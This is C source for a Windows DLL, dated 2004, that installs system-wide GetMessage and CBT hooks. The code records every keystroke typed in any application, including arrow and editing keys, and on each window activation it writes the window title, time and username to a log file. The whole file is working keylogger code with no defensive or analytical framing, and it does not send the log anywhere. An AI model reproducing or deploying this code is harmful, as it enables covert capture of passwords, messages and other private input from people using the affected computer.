/*++ 

  Nome do módulo:
  
	hook_manip.c

  Abstract:

	This source provide procedures to work with windows hooks,
    as well as the CBT hook procedure.

  Author:

	Daniel Koch (Backz)

  History:

	May-2004 Daniel K.
		Created.

--*/

#include <windows.h>
#include <stdio.h>
#include "dllmain.h"
#include "hook_manip.h"
#include "../common/show_error.h"

#pragma data_seg(".SHARDATA")
static FILE *local_logfile = NULL;
static HHOOK message_hook = NULL;
static HHOOK cbt_hook = NULL;
static char filename[MAX_PATH] = "";
static DWORD prev_message_time = 0;
#pragma data_seg()

// To create the GetMessage hook
// This function return TRUE if hook works or FALSE
// if it fail
BOOL create_GetMessage_hook(HINSTANCE hinstDll, LPCSTR path)
{
	if(message_hook == NULL)
	{
		strcpy(filename, path);
		
		message_hook = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)GetMsgProc, hinstDll, 0);
		if(message_hook == NULL) return FALSE;
	}
	else 
	{
		show_error("Error: GetMessage hook was been activated!");
		return FALSE;			
	}
	return TRUE;
}

// To create the CBT hook
// This function return TRUE if hook works or FALSE
// if it fail
BOOL create_CBT_hook(HINSTANCE hinstDll)
{

	if(cbt_hook == NULL)
	{
		cbt_hook = SetWindowsHookEx(WH_CBT, (HOOKPROC)CBTProc, hinstDll, 0);
		if(cbt_hook == NULL) return 0;
	}
	else
	{
		show_error("Error: CBT hook was been activated!");
	}
	return TRUE;
}


// To destroy the GetMessage hook
// This function return the value from UnhookWindowsHookEx
// If the function succeeds, the return value is nonzero.
// If the function fails, the return value is zero.
BOOL destroy_GetMessage_hook(void)
{
	if(message_hook != NULL)
	{
		return UnhookWindowsHookEx(message_hook);
	}
	else
	{
		show_error("Error: GetMessage hook was not activated!");
	}
	return FALSE;
}


// To destroy the CBT hook
// This function return the value from UnhookWindowsHookEx
// If the function succeeds, the return value is nonzero.
// If the function fails, the return value is zero.
BOOL destroy_CBT_hook(void)
{
	if(cbt_hook != NULL)
	{
		return UnhookWindowsHookEx(cbt_hook);
	}
	else
	{
		show_error("Error: CBT hook was not activated!");
	}
	return FALSE;
}


// The GetMessage hook procedure
// used to caputure all events on the system
LRESULT CALLBACK GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam)
{

	char filename_local[MAX_PATH];
	PMSG Msg = (PMSG)lParam;
	DWORD message_time = Msg->time;

	// Must not pass shared pointers to other process's
	strcpy(filename_local, filename);

	
	if(nCode < 0)
		return CallNextHookEx(message_hook, nCode, wParam, lParam);
	
	
	switch(Msg->message)
	{
	case WM_CHAR:
		{
			// compare the post time to prevent two GetMessage's
			if(prev_message_time != message_time)
			{
				local_logfile = fopen(filename_local, "a+");	
				if(local_logfile)
				{
					switch((UINT)Msg->wParam)
					{
					case VK_BACK: // backspace
						{
							fprintf(local_logfile, "[BackSpace]");						
						}
						break;
					case VK_TAB: // tab
						{
							fprintf(local_logfile, "[Tab]");
						}
						break;
					case 13: // return
						{
							TCHAR cchar = '\n';
							fwrite(&cchar, 1, 1, local_logfile);
						}
						break;
					default:
						{
							TCHAR cchar = (char)Msg->wParam;
							fwrite(&cchar, 1, 1, local_logfile);
						}
					}
					fclose(local_logfile);
				}
				else
				{
					show_error("Error: cannot open logfile!");
				}
				prev_message_time = message_time;
			}
		}
		break;
		
	case WM_KEYUP:
		{
			char output[20];
			int flag = 0;

			switch((UINT)Msg->wParam)
			{
			case VK_DELETE:
				{
					strcpy(output, "[Del]");
					flag = 1;
				}
				break;
			case VK_UP:
				{
					strcpy(output, "[Up]");
					flag = 1;
				}
				break;
			case VK_DOWN:
				{
					strcpy(output, "[Down]");
					flag = 1;
				}
				break;
			case VK_RIGHT:
				{
					strcpy(output, "[Right]"); 
					flag = 1;
				}
				break;
			case VK_LEFT:
				{
					strcpy(output, "[Left]"); 
					flag = 1;
				}
				break;
			case VK_HOME:
				{
					strcpy(output, "[Home]"); 
					flag = 1;
				}
				break;
			case VK_INSERT:
				{
					strcpy(output, "[Home]");
					flag = 1;
				}
				break;
			case VK_END:
				{
					strcpy(output, "[End]");
					flag = 1;
				}
				break;
			case VK_PRIOR:
				{
					strcpy(output, "[Page Up]"); 
					flag = 1;
				}
				break;
			case VK_NEXT:
				{
					strcpy(output, "[Page Down]");
					flag = 1;
				}
				break;
			}

			if(flag)
			{
				local_logfile = fopen(filename_local, "a+");
				if(local_logfile)
				{
					fprintf(local_logfile, "%s", output);
					fclose(local_logfile);
				}
				else
				{
					show_error("Error: cannot open logfile!");
				}
			}

		}
		break;
	}

	return 0;
}

// The CBT hook procedure
// used to caputure all events on the system
LRESULT CALLBACK CBTProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	char filename_local[MAX_PATH];

	// Must not pass shared pointers to other process's //
	strcpy(filename_local, filename);

	if(nCode < 0)
		return CallNextHookEx(cbt_hook, nCode, wParam, lParam);
	
	else if(nCode == HCBT_ACTIVATE)
	{
		local_logfile = fopen(filename_local, "a+");
		if(local_logfile)
		{
			HWND hWnd = (HWND)wParam;
			TCHAR window_title[256], current_user[128], current_time[30];
			DWORD cchBuff = 128;

			// Geting window title
			GetWindowText(hWnd, window_title, 256);

			// Getting time
			GetTimeFormat(
					0,                     // locale
					0,                     // options
					NULL,                  // time
					"hh':'mm':'ss tt",     // time format string
					current_time,          // formatted string buffer
					30                     // size of string buffer
			);

			// Getting username
			GetUserName(current_user, &cchBuff);
			fprintf(local_logfile, "\n\n[ Window Title: \"%s\" - Time: \"%s\" - User: \"%s\"]\n", window_title, current_time, current_user);
			fclose(local_logfile);
	
		}
		else
		{
			show_error("Error: cannot open logfile");
		}
	}


	return 0;
}




// return the pointer of message_hook to use when
// DLL is broken
HHOOK *return_message_hook(void)
{
	return &message_hook;
}


// return the pointer of cbt_hook to use when
// DLL is broken
HHOOK *return_cbt_hook(void)
{
	return &cbt_hook;
}